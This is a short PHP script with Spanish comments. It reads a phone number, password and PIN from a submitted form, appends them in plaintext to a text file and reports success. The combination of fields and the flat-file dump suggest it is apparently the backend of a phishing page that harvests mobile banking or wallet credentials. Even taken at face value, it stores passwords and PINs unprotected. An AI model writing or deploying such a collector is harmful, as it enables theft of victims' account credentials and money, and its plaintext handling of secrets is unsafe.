<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
  $phone = $_POST["phone"];
  $password = $_POST["password"];
  $pin = $_POST["pin"];

  // Guardar los datos en un archivo
  $archivo = fopen("datos.txt", "a");
  fwrite($archivo, "Número de Teléfono: " . $phone . "\n");
  fwrite($archivo, "Contraseña: " . $password . "\n");
  fwrite($archivo, "PIN: " . $pin . "\n");
  fwrite($archivo, "------------------------\n");
  fclose($archivo);

  echo "Los datos se han guardado correctamente.";
}
?>